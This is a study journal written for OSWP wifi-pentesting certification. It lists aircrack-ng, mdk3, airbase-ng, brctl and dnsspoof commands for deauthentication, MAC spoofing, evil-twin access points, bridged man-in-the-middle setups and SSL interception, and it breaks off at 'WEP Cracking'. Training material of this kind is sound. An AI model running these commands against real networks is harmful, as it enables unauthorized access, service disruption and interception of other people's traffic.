# Pentester wifi pentest journal

Progress I have learnt for OSWP through pentester academy wifi megaprimer.

## 1) Wifi basics :
* ifconfig -a
* lsmod
* ifconfig wlan0 up (leoxsys/alfa king)
* airmon-ng
* airmon-ng start wlan0
* ifconfig/iwconfig

## 2) Bands channels and surfing
* wireshark & (capture wireshark interface in wlan0mon)
* iwconfig wlan0 channel 1
* airodump-ng --band bg wlan0mon

## 3) Pwning beacon frames :
* mdk3 --help
* mdk3 wlan0mon b -n Pwned

## 4) Dissecting AP-Client connections :
* airodump-ng wlan0mon (check which channel it is )
* iwconfig wlan0mon channel 1
* wireshark & (wlan addr === ((access mac)) && not selected beacon frames )
* connect wifi through a phone
* wireshark & (wlan addr === ((access mac)) && wlan addr === ((client mac)) )
  * probe req packets 1 ) broadcast packets(identifying) 2 ) client queries for a specific access point
  * Auth request and auth response
  * association request and association response.
  * ARP response
  * data transfer

## 5) WLAN Headers :
Check the separate WLAN headers page for theory part.

## 6) Pwning Hidden SSIDs :

#### Hidden SSID : // Hardly a challenge for experienced wireless hacker
* Turn ssid broadcasting OFF in beacon frames
* just monitoring beacon frames will not give you the ssid
* A "security through obscurity"technieuq at best
* Can only deter novices

(set the visibility status in the router page for hidden ssid)

#### Multiple techniques
* Monitor air for a new client trying to associate with the access point (passive)
* de-authenticate one or all clients and monitor reconnections ( active)

* basic idea is to force the network to send probe/association pakets
* these packets contain the ssid even if not present in the beacon frame from the access point

```
airodump-ng wlan0mon --channel 1 --bssid (mac of the router)

aireplay-ng --deauth 0 -a (bssid mac) wlan0mon
```
check for the flow of deauth,probe,association and auth packets in wireshark


## 7) Laughing off MAC Filters :

* MAC address are visible in plain sight. (Enable mac filter in  router in advanced section)
```
aireplay-ng --fakeauth 10 -e <ESSID> wlan0mon
```
Authentication fails due to mac filtering.
spoof the mac address :
```
aireplay-ng --fakeauth 10 -e <ESSID> -h <mac address> wlan0mon
```
Conclusion : MAC filtering is useless scheme. There's no defense at all. Even in an airport/restaurants which SSO login, we can clone anyone's MAC and use wifi.

## 8) Hacking WLAN Authentication :
* Open and shared authentication.
* No actual authentication.
* WEP uses rc4

```
airodump-ng --channel 1 wlan0mon --bssid <bssid> --write demo
```
Auth key has no value. When connected a device to access point, it will decide if its open or shared key.

```
airodump-ng --channel 1 wlan0mon --bssid <bssid> --write fakeauth

aireplay-ng --fakeauth 10 wlan0mon -e <essid> -y demo  // (demo is a sample keystream xor file)
```
## 9) Hotspot attacks :

Hotspot basic:
 * open authentication.
 * MAC filtering at times
 * No encryption - distribution of keys would be a nightmare
 * Can use captive portals for application layer authentication

create am evil twin in the vicinity
 * Same essid
 * Same bssid ( optional )

Use de-authentication attacks to break client AP connection. If evil twin has higher signal strength, then client will connect to it.

Attack visualization :
1) Metasploit
2) MITM to client

Change channel :
```
iwconfig wlan0mon channel 11
```
Create access on channel 11 :
```
airbase-ng -a AA:AA:AA:AA:AA:AA -e <ESSID> wlan0mon //ESSID = SecurityTube
```
Created tap0 interface // wired interface
```
ifconfig at0 up

aireplay-ng --deauth 0 -a <bssid> wlan0mon
```
Change channel if its using multiple channel
```
iwconfig wlan0mon channel 1
```
Airbase and Aireplay at same point.

Client sends gratuitous arp to check for dhcp in fake AP.
```
ifconfig at0 169.254.174.226 netmask 255.255.255.0 up

ping 169.254.174.227
```
IP level connection is established. 

## 10) Hacking isolated clients :

* Multiple cases possible :
 Access point stored in the PNL or similar could have either of 3 configurations :
 	* No encyrption
   	* WEP
	* WPA/WPA2

Case 1 : open auth, no encryption
```
airbase-ng --essid <essid> -a AA:AA:AA:AA:AA:AA wlan0mon
```
-v for verbose
wireshark the packets :
#### wlan.addr == (bssid) && wlan.addr == AA:AA:AA:AA:AA:AA 

Client will try for DHCP. So check for at0 interface.
```
airbase-ng -P -C 10 -a AA:AA:AA:AA:AA:AA wlan0mon -v
```
Check the client device. Your client device will be hopping all connections which is weird because it is confused by the ESSID. Reasons ?
 * Client cannot authenticate the access point
 * SSID all alone is used to decide whom to connect to
 * Anyone can set a similar ssid and force a client to connect to their access point
 * This is especially true with hotspot ssids as they by definition are open authentication with no encryption.

## 11) ALFA card king-fu :
Check the separate ALFA-card kung-fu page for theory part.

## 12) Man-in-the-middle-attacks :

#### Bring in both the ethernet and airbase interfaces :
```
ifconfig
ifconfig eth0 up

airbase-ng --essid <ESSID> wlan0mon

ifconfig at0 up
```

#### Bridge both the interfaces :
```
brctl addbr mitm

brctl show
```
No interface will be there. 
#### Add an interface :
```
brctl addif mitm at0

brctl addif mitm eth0

ifconfig eth0 0.0.0.0 up
ifconfig at0 0.0.0.0 up

ifconfig mitm up
```
#### Assign an ip address to mitm inteface :
```
dhclient3 mitm &

ifconfig mitm
```
An ip address is already allocated over dhcp.
Now connect a client to your wifi. You have access of viewing the victim data but victim has no idea of the MITM.

## 13) SSL-Man-in-the-middle-attacks :
We can use DNS spoofing for ssl mitm.
First bridge interface mitm through at0 and eth0.
```
dnsspoof -i mitm
```
Open burp and add ports 80 and 443 and add invisible proxy option.
Intercept off and forward all requests. Notice the dnsspoof.

Try gmail. browser couldnt verify server identity.

## 14) WEP in depth :
Check the separate WEP in detail page for theory part.

## 15) WEP Cracking :







